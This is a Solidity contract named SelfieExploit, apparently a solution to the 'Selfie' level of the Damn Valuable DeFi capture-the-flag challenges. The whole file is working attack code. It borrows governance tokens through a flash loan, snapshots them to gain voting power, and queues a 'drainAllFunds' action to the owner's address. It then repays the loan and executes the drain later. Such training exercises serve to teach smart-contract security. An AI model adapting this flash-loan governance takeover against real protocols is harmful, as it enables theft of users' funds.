pragma solidity ^0.8.0;

import "../DamnValuableTokenSnapshot.sol";

interface Governance {
	function queueAction(address receiver, bytes calldata data, uint256 weiAmount) external returns (uint256);
	function executeAction(uint256 actionId) external payable;
}

interface Pool {
	function flashLoan(uint256 borrowAmount) external;
}

/**
 * The SelfieExploit contract takes a flash loan to queue an action of draining all funds to an attacker-controlled address.
 */
contract SelfieExploit {
	address private governance;
	address private owner;
	uint256 public drainActionId;

	constructor(address _owner, address _gov) {
		owner = _owner;
		governance = _gov;
	}

	function exploit(address _pool, uint256 _amount) external {
		require(msg.sender == owner);
		Pool(_pool).flashLoan(_amount);
	}

	function drainPool() external {
		require(msg.sender == owner);
		Governance(governance).executeAction(drainActionId);
	}

	function receiveTokens(address _token, uint256 _amount) external {
		// Required or the 'DamnValuableTokenSnapshot' will throw an 'id is zero' error since no snapshot is taken in the governance contract
		DamnValuableTokenSnapshot(_token).snapshot();

		drainActionId = Governance(governance).queueAction(msg.sender, abi.encodeWithSignature("drainAllFunds(address)", owner), 0); // Store the 'actionId' to execute it 2 days later
		DamnValuableTokenSnapshot(_token).transfer(msg.sender, _amount); // Pay back flash loan
	}
}

